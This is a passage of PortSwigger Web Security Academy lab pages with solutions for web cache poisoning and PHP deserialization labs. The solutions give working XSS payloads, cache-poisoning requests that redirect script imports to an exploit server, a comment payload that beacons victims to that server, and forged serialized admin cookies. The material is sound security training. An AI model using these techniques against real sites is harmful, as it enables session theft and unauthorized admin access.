                                <li>
                                    Add a cache-buster query parameter and the
                                    <code>
        X-Forwarded-Host
       </code>
                                    header with an arbitrary hostname, such as
                                    <code>
        example.com
       </code>
                                    . Notice that this doesn't seem to have any effect on the response.
                                </li>
                                <li>
                                    Remove the
                                    <code>
        X-Forwarded-Host
       </code>
                                    header and add the
                                    <code>
        X-Forwarded-Scheme
       </code>
                                    header instead. Notice that if you include any value other than
                                    <code>
        HTTPS
       </code>
                                    , you receive a 302 response. The
                                    <code>
        Location
       </code>
                                    header shows that you are being redirected to the same URL that you requested, but
                                    using
                                    <code>
        https://
       </code>
                                    .
                                </li>
                                <li>
                                    Add the
                                    <code>
        X-Forwarded-Host: example.com
       </code>
                                    header back to the request, but keep
                                    <code>
        X-Forwarded-Scheme: nothttps
       </code>
                                    as well. Send this request and notice that the
                                    <code>
        Location
       </code>
                                    header of the 302 redirect now points to
                                    <code>
        https://example.com/
       </code>
                                    .
                                </li>
                                <li>
                                    <p>
                                        Go to the exploit server and change the file name to match the path used by the
                                        vulnerable response:
                                    </p>
                                    <code class="code-scrollable">
        /resources/js/tracking.js
       </code>
                                </li>
                                <li>
                                    In the body, enter the payload
                                    <code>
        alert(document.cookie)
       </code>
                                    and store the exploit.
                                </li>
                                <li>
                                    <p>
                                        Go back to the request in Burp Repeater and set the
                                        <code>
         X-Forwarded-Host
        </code>
                                        header as follows, remembering to enter your own exploit server ID:
                                    </p>
                                    <code class="code-scrollable">
        X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
       </code>
                                </li>
                                <li>
                                    Make sure the
                                    <code>
        X-Forwarded-Scheme
       </code>
                                    header is set to anything other than
                                    <code>
        HTTPS
       </code>
                                    .
                                </li>
                                <li>
                                    Send the request until you see your exploit server URL reflected in the response and
                                    <code>
        X-Cache: hit
       </code>
                                    in the headers.
                                </li>
                                <li>
                                    To check that the response was cached correctly, right-click on the request in Burp,
                                    select "Copy URL", and load this URL in Burp's browser. If the cache was
                                    successfully poisoned, you will see the script containing your payload,
                                    <code>
        alert(document.cookie)
       </code>
                                    . Note that the
                                    <code>
        alert()
       </code>
                                    won't actually execute here.
                                </li>
                                <li>
                                    Go back to Burp Repeater, remove the cache buster, and resend the request until you
                                    poison the cache again.
                                </li>
                                <li>
                                    To simulate the victim, reload the home page in the browser and make sure that the
                                    <code>
        alert()
       </code>
                                    fires.
                                </li>
                                <li>
                                    Keep replaying the request to keep the cache poisoned until the victim visits the
                                    site and the lab is solved.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Targeted web cache poisoning using an unknown header
                (web-cache-poisoning)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to
                <a href="https://portswigger.net/web-security/web-cache-poisoning">
                    web cache poisoning
                </a>
                . A victim user will view any comments that you post. To solve this lab, you need to poison the cache
                with a response that executes
                <code>
   alert(document.cookie)
  </code>
                in the visitor's browser. However, you also need to make sure that the response is served to the
                specific subset of users to which the intended victim belongs.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/d6f044fd123351c4a58cf52862ce204541864a727f83fca937a5ebe40542a162?referrer=%2fweb-security%2fweb-cache-poisoning%2fexploiting-design-flaws%2flab-web-cache-poisoning-targeted-using-an-unknown-header"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                Solving this lab requires multiple steps. First, you need to identify where the
                                vulnerability is and study how the cache behaves. You then need to find a way of
                                targeting the right subset of users before finally poisoning the cache accordingly.
                            </p>
                            <ol>
                                <li>
                                    With Burp running, load the website's home page.
                                </li>
                                <li>
                                    In Burp, go to "Proxy" &gt; "HTTP history" and study the requests and responses that
                                    you generated. Find the
                                    <code>
        GET
       </code>
                                    request for the home page.
                                </li>
                                <li>
                                    With the
                                    <a href="https://portswigger.net/web-security/web-cache-poisoning#param-miner">
                                        Param Miner
                                    </a>
                                    extension enabled, right-click on the request and select "Guess headers". After a
                                    while, Param Miner will report that there is a secret input in the form of the
                                    <code>
        X-Host
       </code>
                                    header.
                                </li>
                                <li>
                                    Send the
                                    <code>
        GET
       </code>
                                    request to Burp Repeater and add a cache-buster query parameter.
                                </li>
                                <li>
                                    Add the
                                    <code>
        X-Host
       </code>
                                    header with an arbitrary hostname, such as
                                    <code>
        example.com
       </code>
                                    . Notice that the value of this header is used to dynamically generate an absolute
                                    URL for importing the JavaScript file stored at
                                    <code>
        /resources/js/tracking.js
       </code>
                                    .
                                </li>
                                <li>
                                    <p>
                                        Go to the exploit server and change the file name to match the path used by the
                                        vulnerable response:
                                    </p>
                                    <code class="code-scrollable">
        /resources/js/tracking.js
       </code>
                                </li>
                                <li>
                                    In the body, enter the payload
                                    <code>
        alert(document.cookie)
       </code>
                                    and store the exploit.
                                </li>
                                <li>
                                    <p>
                                        Go back to the request in Burp Repeater and set the
                                        <code>
         X-Host
        </code>
                                        header as follows, remembering to add your own exploit server ID:
                                    </p>
                                    <code class="code-scrollable">
        X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
       </code>
                                </li>
                                <li>
                                    Send the request until you see your exploit server URL reflected in the response and
                                    <code>
        X-Cache: hit
       </code>
                                    in the headers.
                                </li>
                                <li>
                                    To simulate the victim, load the URL in the browser and make sure that the
                                    <code>
        alert()
       </code>
                                    fires.
                                </li>
                                <li>
                                    Notice that the
                                    <code>
        Vary
       </code>
                                    header is used to specify that the
                                    <code>
        User-Agent
       </code>
                                    is part of the cache key. To target the victim, you need to find out their
                                    <code>
        User-Agent
       </code>
                                    .
                                </li>
                                <li>
                                    <p>
                                        On the website, notice that the comment feature allows certain HTML tags. Post a
                                        comment containing a suitable payload to cause the victim's browser to interact
                                        with your exploit server, for example:
                                    </p>
                                    <code class="code-scrollable">
        &lt;img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" /&gt;
       </code>
                                </li>
                                <li>
                                    Go to the blog page and double-check that your comment was successfully posted.
                                </li>
                                <li>
                                    Go to the exploit server and click the button to open the "Access log". Refresh the
                                    page every few seconds until you see requests made by a different user. This is the
                                    victim. Copy their
                                    <code>
        User-Agent
       </code>
                                    from the log.
                                </li>
                                <li>
                                    Go back to your malicious request in Burp Repeater and paste the victim's
                                    <code>
        User-Agent
       </code>
                                    into the corresponding header. Remove the cache buster.
                                </li>
                                <li>
                                    Keep sending the request until you see your exploit server URL reflected in the
                                    response and
                                    <code>
        X-Cache: hit
       </code>
                                    in the headers.
                                </li>
                                <li>
                                    Replay the request to keep the cache poisoned until the victim visits the site and
                                    the lab is solved
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Web cache poisoning via an unkeyed query string
                (web-cache-poisoning)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to
                <a href="https://portswigger.net/web-security/web-cache-poisoning">
                    web cache poisoning
                </a>
                because the query string is unkeyed. A user regularly visits this site's home page using Chrome.
            </p>
            <p>
                To solve the lab, poison the home page with a response that executes
                <code>
   alert(1)
  </code>
                in the victim's browser.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ul>
                                <li>
                                    If you're struggling, you can use the
                                    <code>
        Pragma: x-get-cache-key
       </code>
                                    header to display the cache key in the response. This applies to some of the other
                                    labs as well.
                                </li>
                                <li>
                                    Although you can't use a query parameter as a cache buster, there is a common
                                    request header that will be keyed if present. You can use the
                                    <a href="https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943">
                                        Param Miner
                                    </a>
                                    extension to automatically add a cache buster header to your requests.
                                </li>
                            </ul>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/c3cbe5abaf85f50bfc76fb4c591a3811dcc7e393cbce37d987780b4c79ecf1c4?referrer=%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    With Burp running, load the website's home page. In Burp, go to "Proxy" &gt; "HTTP
                                    history". Find the
                                    <code>
        GET
       </code>
                                    request for the home page. Notice that this page is a potential cache oracle. Send
                                    the request to Burp Repeater.
                                </li>
                                <li>
                                    Add arbitrary query parameters to the request. Observe that you can still get a
                                    cache hit even if you change the query parameters. This indicates that they are not
                                    included in the cache key.
                                </li>
                                <li>
                                    Notice that you can use the
                                    <code>
        Origin
       </code>
                                    header as a cache buster. Add it to your request.
                                </li>
                                <li>
                                    When you get a cache miss, notice that your injected parameters are reflected in the
                                    response. If the response to your request is cached, you can remove the query
                                    parameters and they will still be reflected in the cached response.
                                </li>
                                <li>
                                    <p>
                                        Add an arbitrary parameter that breaks out of the reflected string and injects
                                        an
                                        <a href="https://portswigger.net/web-security/cross-site-scripting">
                                            XSS
                                        </a>
                                        payload:
                                    </p>
                                    <code class="code-scrollable">
        GET /?evil='/&gt;&lt;script&gt;alert(1)&lt;/script&gt;
       </code>
                                </li>
                                <li>
                                    Keep replaying the request until you see your payload reflected in the response and
                                    <code>
        X-Cache: hit
       </code>
                                    in the headers.
                                </li>
                                <li>
                                    To simulate the victim, remove the query string from your request and send it again
                                    (while using the same cache buster). Check that you still receive the cached
                                    response containing your payload.
                                </li>
                                <li>
                                    Remove the cache-buster
                                    <code>
        Origin
       </code>
                                    header and add your payload back to the query string. Replay the request until you
                                    have poisoned the cache for normal users. Confirm this attack has been successful by
                                    loading the home page in the browser and observing the popup.
                                </li>
                                <li>
                                    The lab will be solved when the victim user visits the poisoned home page. You may
                                    need to re-poison the cache if the lab is not solved after 35 seconds.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Web cache poisoning via an unkeyed query parameter
                (web-cache-poisoning)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to
                <a href="https://portswigger.net/web-security/web-cache-poisoning">
                    web cache poisoning
                </a>
                because it excludes a certain parameter from the cache key. A user regularly visits this site's home
                page using Chrome.
            </p>
            <p>
                To solve the lab, poison the cache with a response that executes
                <code>
   alert(1)
  </code>
                in the victim's browser.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                Websites often exclude certain UTM analytics parameters from the cache key.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/f14385ab65ba5ac2e5d347c09f32b51bd9ac1e55946c15aec01dd0f3e902a863?referrer=%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-param"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Observe that the home page is a suitable cache oracle. Notice that you get a cache
                                    miss whenever you change the query string. This indicates that it is part of the
                                    cache key. Also notice that the query string is reflected in the response.
                                </li>
                                <li>
                                    Add a cache-buster query parameter.
                                </li>
                                <li>
                                    Use Param Miner's "Guess GET parameters" feature to identify that the parameter
                                    <code>
        utm_content
       </code>
                                    is supported by the application.
                                </li>
                                <li>
                                    Confirm that this parameter is unkeyed by adding it to the query string and checking
                                    that you still get a cache hit. Keep sending the request until you get a cache miss.
                                    Observe that this unkeyed parameter is also reflected in the response along with the
                                    rest of the query string.
                                </li>
                                <li>
                                    <p>
                                        Send a request with a
                                        <code>
         utm_content
        </code>
                                        parameter that breaks out of the reflected string and injects an
                                        <a href="https://portswigger.net/web-security/cross-site-scripting">
                                            XSS
                                        </a>
                                        payload:
                                    </p>
                                    <code class="code-scrollable">
        GET /?utm_content='/&gt;&lt;script&gt;alert(1)&lt;/script&gt;
       </code>
                                </li>
                                <li>
                                    Once your payload is cached, remove the
                                    <code>
        utm_content
       </code>
                                    parameter, right-click on the request, and select "Copy URL". Open this URL in the
                                    browser and check that the
                                    <code>
        alert()
       </code>
                                    is triggered when you load the page.
                                </li>
                                <li>
                                    Remove your cache buster, re-add the
                                    <code>
        utm_content
       </code>
                                    parameter with your payload, and replay the request until the cache is poisoned for
                                    normal users. The lab will be solved when the victim user visits the poisoned home
                                    page.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Parameter cloaking
                (web-cache-poisoning)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to
                <a href="https://portswigger.net/web-security/web-cache-poisoning">
                    web cache poisoning
                </a>
                because it excludes a certain parameter from the cache key. There is also inconsistent parameter parsing
                between the cache and the back-end. A user regularly visits this site's home page using Chrome.
            </p>
            <p>
                To solve the lab, use the parameter cloaking technique to poison the cache with a response that executes
                <code>
   alert(1)
  </code>
                in the victim's browser.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                The website excludes a certain UTM analytics parameter.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/0e7fb21969d7178a1c1ae847cd2b80f7a277dee996bd1450604ba28d8d7a25da?referrer=%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-param-cloaking"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Identify that the
                                    <code>
        utm_content
       </code>
                                    parameter is supported. Observe that it is also excluded from the cache key.
                                </li>
                                <li>
                                    Notice that if you use a semicolon (
                                    <code>
        ;
       </code>
                                    ) to append another parameter to
                                    <code>
        utm_content
       </code>
                                    , the cache treats this as a single parameter. This means that the extra parameter
                                    is also excluded from the cache key. Alternatively, with Param Miner loaded,
                                    right-click on the request and select "Bulk scan" &gt; "Rails parameter cloaking
                                    scan" to identify the vulnerability automatically.
                                </li>
                                <li>
                                    Observe that every page imports the script
                                    <code>
        /js/geolocate.js
       </code>
                                    , executing the callback function
                                    <code>
        setCountryCookie()
       </code>
                                    . Send the request
                                    <code>
        GET /js/geolocate.js?callback=setCountryCookie
       </code>
                                    to Burp Repeater.
                                </li>
                                <li>
                                    Notice that you can control the name of the function that is called on the returned
                                    data by editing the
                                    <code>
        callback
       </code>
                                    parameter. However, you can't poison the cache for other users in this way because
                                    the parameter is keyed.
                                </li>
                                <li>
                                    <p>
                                        Study the cache behavior. Observe that if you add duplicate
                                        <code>
         callback
        </code>
                                        parameters, only the final one is reflected in the response, but both are still
                                        keyed. However, if you append the second
                                        <code>
         callback
        </code>
                                        parameter to the
                                        <code>
         utm_content
        </code>
                                        parameter using a semicolon, it is excluded from the cache key and still
                                        overwrites the callback function in the response:
                                    </p>
                                    <code class="code-scrollable">
        GET /js/geolocate.js?callback=setCountryCookie&amp;utm_content=foo;callback=arbitraryFunction

HTTP/1.1 200 OK
X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
â€¦
arbitraryFunction({"country" : "United Kingdom"})
       </code>
                                </li>
                                <li>
                                    <p>
                                        Send the request again, but this time pass in
                                        <code>
         alert(1)
        </code>
                                        as the callback function:
                                    </p>
                                    <code class="code-scrollable">
        GET /js/geolocate.js?callback=setCountryCookie&amp;utm_content=foo;callback=alert(1)
       </code>
                                </li>
                                <li>
                                    Get the response cached, then load the home page in the browser. Check that the
                                    <code>
        alert()
       </code>
                                    is triggered.
                                </li>
                                <li>
                                    Replay the request to keep the cache poisoned. The lab will solve when the victim
                                    user visits any page containing this resource import URL.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Web cache poisoning via a fat GET request
                (web-cache-poisoning)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to
                <a href="https://portswigger.net/web-security/web-cache-poisoning">
                    web cache poisoning
                </a>
                . It accepts
                <code>
   GET
  </code>
                requests that have a body, but does not include the body in the cache key. A user regularly visits this
                site's home page using Chrome.
            </p>
            <p>
                To solve the lab, poison the cache with a response that executes
                <code>
   alert(1)
  </code>
                in the victim's browser.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/445170885a5022d81beaf56ed8c332d3ce302fe5d37e99e61a0674d3ac3e6260?referrer=%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-fat-get"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Observe that every page imports the script
                                    <code>
        /js/geolocate.js
       </code>
                                    , executing the callback function
                                    <code>
        setCountryCookie()
       </code>
                                    . Send the request
                                    <code>
        GET /js/geolocate.js?callback=setCountryCookie
       </code>
                                    to Burp Repeater.
                                </li>
                                <li>
                                    <p>
                                        Notice that you can control the name of the function that is called in the
                                        response by passing in a duplicate
                                        <code>
         callback
        </code>
                                        parameter via the request body. Also notice that the cache key is still derived
                                        from the original
                                        <code>
         callback
        </code>
                                        parameter in the request line:
                                    </p>
                                    <code class="code-scrollable">
        GET /js/geolocate.js?callback=setCountryCookie
â€¦
callback=arbitraryFunction

HTTP/1.1 200 OK
X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
â€¦
arbitraryFunction({"country" : "United Kingdom"})
       </code>
                                </li>
                                <li>
                                    Send the request again, but this time pass in
                                    <code>
        alert(1)
       </code>
                                    as the callback function. Check that you can successfully poison the cache.
                                </li>
                                <li>
                                    Remove any cache busters and re-poison the cache. The lab will solve when the victim
                                    user visits any page containing this resource import URL.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: URL normalization
                (web-cache-poisoning)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains an XSS vulnerability that is not directly exploitable due to browser URL-encoding.
            </p>
            <p>
                To solve the lab, take advantage of the cache's normalization process to exploit this vulnerability.
                Find the XSS vulnerability and inject a payload that will execute
                <code>
   alert(1)
  </code>
                in the victim's browser. Then, deliver the malicious URL to the victim.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/da7b121cfc61090ed5e7cecb6c6f31b595087c04ea02056591225cf659e72eec?referrer=%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-normalization"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    In Burp Repeater, browse to any non-existent path, such as
                                    <code>
        GET /random
       </code>
                                    . Notice that the path you requested is reflected in the error message.
                                </li>
                                <li>
                                    <p>
                                        Add a suitable
                                        <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">
                                            reflected XSS
                                        </a>
                                        payload to the request line:
                                    </p>
                                    <code class="code-scrollable">
        GET /random&lt;/p&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;p&gt;foo
       </code>
                                </li>
                                <li>
                                    Notice that if you request this URL in the browser, the payload doesn't execute
                                    because it is URL-encoded.
                                </li>
                                <li>
                                    In Burp Repeater, poison the cache with your payload and then immediately load the
                                    URL in the browser. This time, the
                                    <code>
        alert()
       </code>
                                    is executed because the browser's encoded payload was URL-decoded by the cache,
                                    causing a cache hit with the earlier request.
                                </li>
                                <li>
                                    Re-poison the cache then immediately go to the lab and click "Deliver link to
                                    victim". Submit your malicious URL. The lab will be solved when the victim visits
                                    the link.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Modifying serialized objects
                (deserialization)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a
                result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability
                and gain administrative privileges. Then, delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/ad2372c69112d9c171d435fd5f674dbcb3efe60b13777c9eefe764ec7797b802?referrer=%2fweb-security%2fdeserialization%2fexploiting%2flab-deserialization-modifying-serialized-objects"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in using your own credentials. Notice that the post-login
                                    <code>
        GET /my-account
       </code>
                                    request contains a session cookie that appears to be URL and Base64-encoded.
                                </li>
                                <li>
                                    Use Burp's Inspector panel to study the request in its decoded form. Notice that the
                                    cookie is in fact a serialized PHP object. The
                                    <code>
        admin
       </code>
                                    attribute contains
                                    <code>
        b:0
       </code>
                                    , indicating the boolean value
                                    <code>
        false
       </code>
                                    . Send this request to Burp Repeater.
                                </li>
                                <li>
                                    In Burp Repeater, use the Inspector to examine the cookie again and change the value
                                    of the
                                    <code>
        admin
       </code>
                                    attribute to
                                    <code>
        b:1
       </code>
                                    . Click "Apply changes". The modified object will automatically be re-encoded and
                                    updated in the request.
                                </li>
                                <li>
                                    Send the request. Notice that the response now contains a link to the admin panel at
                                    <code>
        /admin
       </code>
                                    , indicating that you have accessed the page with admin privileges.
                                </li>
                                <li>
                                    Change the path of your request to
                                    <code>
        /admin
       </code>
                                    and resend it. Notice that the
                                    <code>
        /admin
       </code>
                                    page contains links to delete specific user accounts.
                                </li>
                                <li>
                                    Change the path of your request to
                                    <code>
        /admin/delete?username=carlos
       </code>
                                    and send the request to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Modifying serialized data types
                (deserialization)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a
                result. To solve the lab, edit the serialized object in the session cookie to access the
                <code>
   administrator
  </code>
                account. Then, delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                To access another user's account, you will need to exploit a quirk in how PHP compares
                                data of different types.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/445830f9c9a370d46e54ae646b92704ea142e1ac742174de313060662a9c9a96?referrer=%2fweb-security%2fdeserialization%2fexploiting%2flab-deserialization-modifying-serialized-data-types"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in using your own credentials. In Burp, open the post-login
                                    <code>
        GET /my-account
       </code>
                                    request and examine the session cookie using the Inspector to reveal a serialized
                                    PHP object. Send this request to Burp Repeater.
                                </li>
                                <li>
                                    In Burp Repeater, use the Inspector panel to modify the session cookie as follows:
                                    <ul>
                                        <li>
                                            Update the length of the
                                            <code>
          username
         </code>
                                            attribute to
                                            <code>
          13
         </code>
                                            .
                                        </li>
                                        <li>
                                            Change the username to
                                            <code>
          administrator
         </code>
                                            .
                                        </li>
                                        <li>
                                            Change the access token to the integer
                                            <code>
          0
         </code>
                                            . As this is no longer a string, you also need to remove the double-quotes
                                            surrounding the value.
                                        </li>
                                        <li>
                                            Update the data type label for the access token by replacing
                                            <code>
          s
         </code>
                                            with
                                            <code>
          i
         </code>
                                            .
                                        </li>
                                    </ul>
                                    <p>
                                        The result should look like this:
                                    </p>
                                    <code class="code-scrollable">
        O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
       </code>
                                </li>
                                <li>
                                    Click "Apply changes". The modified object will automatically be re-encoded and
                                    updated in the request.
                                </li>
                                <li>
                                    Send the request. Notice that the response now contains a link to the admin panel at
                                    <code>
        /admin
       </code>
                                    , indicating that you have successfully accessed the page as the
                                    <code>
        administrator
       </code>
                                    user.
                                </li>
                                <li>
                                    Change the path of your request to
                                    <code>
        /admin
       </code>
                                    and resend it. Notice that the
                                    <code>
        /admin
       </code>
                                    page contains links to delete specific user accounts.
                                </li>
                                <li>
                                    Change the path of your request to
                                    <code>
        /admin/delete?username=carlos
       </code>
                                    and send the request to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Using application functionality to exploit
                <a href="https://portswigger.net/web-security/deserialization">
                    insecure deserialization
                </a>
                (deserialization)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on
                data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie
                and use it to delete the
                <code>
   morale.txt
  </code>
                file from Carlos's home directory.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <p>
                You also have access to a backup account:
                <code>
   gregg:rosebud
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/5239aa2e1e68409057bbd4a72799714b50acabc542275a95bc242612a8c6ed41?referrer=%2fweb-security%2fdeserialization%2fexploiting%2flab-deserialization-using-application-functionality-to-exploit-insecure-deserialization"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
